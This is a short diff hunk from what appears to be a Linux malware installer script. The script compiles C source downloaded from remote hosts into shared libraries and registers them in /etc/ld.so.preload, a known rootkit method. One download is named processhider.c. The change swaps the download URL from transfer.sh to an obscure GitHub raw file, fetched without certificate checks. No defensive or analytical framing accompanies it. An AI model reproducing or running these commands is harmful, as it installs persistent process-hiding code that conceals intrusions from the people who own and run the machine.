@@ -30,7 +30,7 @@
         gcc -Wall -fPIC -shared -o $l1.so $h1.c -ldl
         sudo mv $l1.so /usr/local/lib/ 
         echo /usr/local/lib/$l1.so >> /etc/ld.so.preload 
-        wget --no-check-certificate -c http://transfer.sh/ntzeku/processhider.c -O $h2.c 
+        wget --no-check-certificate -c https://github.com/unmsjd28/ynsg7s9/raw/main/mko.c -O $h2.c 
         gcc -Wall -fPIC -shared -o $l2.so $h2.c -ldl
         sudo mv $l2.so /usr/local/lib/ 
         echo /usr/local/lib/$l2.so >> /etc/ld.so.preload 
